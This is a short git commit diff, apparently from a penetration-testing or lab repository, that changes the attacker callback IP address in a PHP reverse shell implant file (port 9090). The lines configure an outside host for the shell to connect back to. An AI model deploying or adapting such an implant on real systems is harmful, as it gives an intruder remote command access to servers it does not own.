2ca9bd7a08aa0021c6009be836e16cd6a73a3daa
root <root@kali>
2022-10-08 20:15:41 -0400

    Update for new exploits OCT

--- 06_Implants/php/php-reverse-shell.php
+++ 06_Implants/php/php-reverse-shell.php
@@ -46,7 +46,7 @@
 
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '192.168.49.77';  // CHANGE THIS
+$ip = '10.50.102.185';  // CHANGE THIS
 $port = 9090;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
